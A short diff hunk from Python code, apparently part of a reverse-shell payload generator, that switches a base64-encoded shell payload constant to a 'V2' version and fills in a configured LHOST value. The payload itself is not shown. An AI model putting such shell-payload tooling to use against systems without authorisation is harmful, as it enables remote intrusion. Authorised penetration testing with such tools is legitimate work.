@@ -65,7 +65,7 @@ def start_session(command):
 
 
 def read_payload():
-    payload = base64.b64decode(EncodeBase.PAYLOAD_TYPE_SHELL)
+    payload = base64.b64decode(EncodeBase.PAYLOAD_TYPE_SHELL_V2)
     return (
         payload.decode()
         .replace("${LHOST}", f"'{variablesConfig["generate.lhost"]}'")
